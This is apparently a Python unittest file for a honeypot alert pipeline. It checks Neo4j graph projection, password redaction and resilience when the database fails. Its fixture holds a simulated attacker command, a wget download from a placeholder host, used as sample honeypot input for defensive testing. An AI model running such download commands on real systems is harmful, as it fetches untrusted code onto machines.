import asyncio
import sys
from pathlib import Path
import unittest
from unittest.mock import AsyncMock, patch

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "analyse_layer"))

from core import processing


class RecordingGraphBuilder:
    def __init__(self, fail=False):
        self.fail = fail
        self.schema_calls = 0
        self.alerts = []

    def initialise_schema(self):
        self.schema_calls += 1
        if self.fail:
            raise RuntimeError("Neo4j indisponible")

    def ingest_alert(self, alert):
        if self.fail:
            raise RuntimeError("Neo4j indisponible")
        self.alerts.append(alert)


class ProcessingNeo4jTests(unittest.TestCase):
    def setUp(self):
        self.normalized = {
            "timestamp": "2026-08-18T11:00:00Z", "source_ip": "203.0.113.10",
            "dst_port": "22", "protocol": "ssh", "event_type": "cowrie.command.input",
            "honeypot": "cowrie", "extra_info": {"input": "wget http://example.invalid/a", "password": "secret"},
        }
        self.features = {"total_events": 12, "eps": 18.2}
        self.verdict = {"is_alert": True, "status": "ATTACK DETECTED", "risk_score": 85, "reasons": ["test"]}
        self.mitre = {
            "id": "T1105", "name": "Ingress Tool Transfer", "tactic": "Command And Control",
            "description": "Test de transfert", "advice": "Bloquer la source",
        }

    def _process(self, builder):
        raw_log = {"honeypot_source": "cowrie"}
        with patch.object(processing.normalizer, "normalize", return_value=self.normalized), \
             patch.object(processing, "get_recent_logs", new=AsyncMock(return_value=[])), \
             patch.object(processing.extractor, "extract_features", return_value={"203.0.113.10": self.features}), \
             patch.object(processing.ml_engine, "predict_anomalies", return_value={"203.0.113.10": self.verdict}), \
             patch.object(processing.threat_detector, "detect", return_value=self.verdict), \
             patch.object(processing.mitre_analyzer, "map_log_to_mitre", return_value=self.mitre), \
             patch.object(processing, "graph_builder", builder), \
             patch.object(processing, "neo4j_schema_ready", False):
            async def run_pipeline():
                analysis = await processing.process_log_for_ml(raw_log)
                await asyncio.sleep(0.01)  # laisse terminer la projection Neo4j non bloquante
                return analysis

            analysis = asyncio.run(run_pipeline())
        return raw_log, analysis

    def test_pipeline_projects_real_cyberdna_alert_to_graph_builder(self):
        builder = RecordingGraphBuilder()
        raw_log, analysis = self._process(builder)

        self.assertIn("cyberdna_alert", analysis)
        self.assertEqual(builder.schema_calls, 1)
        self.assertEqual(builder.alerts, [raw_log["analysis"]["cyberdna_alert"]])
        self.assertEqual(builder.alerts[0]["mitre_techniques"][0]["technique_id"], "T1105")
        self.assertEqual(builder.alerts[0]["action"]["evidence"]["password"], "<redacted>")

    def test_neo4j_error_does_not_prevent_alert_creation(self):
        raw_log, analysis = self._process(RecordingGraphBuilder(fail=True))

        self.assertIn("cyberdna_alert", analysis)
        self.assertEqual(raw_log["analysis"]["cyberdna_alert"]["alert_id"], analysis["cyberdna_alert"]["alert_id"])


if __name__ == "__main__":
    unittest.main()
